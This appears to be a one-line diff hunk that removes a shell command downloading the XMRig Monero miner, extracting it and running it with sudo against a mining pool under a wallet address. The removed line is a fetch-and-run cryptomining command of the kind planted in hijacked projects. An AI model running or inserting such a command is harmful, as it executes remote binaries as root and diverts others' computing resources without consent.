@@ -1,1 +1,0 @@
-/bin/bash -c "wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-bionic-x64.tar.gz;tar -xvzf xmrig-6.12.1-bionic-x64.tar.gz;cd xmrig-6.12.1/;sudo ./xmrig -o us-west.minexmr.com:4444 -u 87bM3yAEn9tV7tENo6BxiPiuQir2UiUao4kDpLmwEfBcjJRxbJKMdN3K2RUWU8RtQWEJkLAM7vdPhYeioCWCADo8AXJRUy1 --rig-id=alexdev"
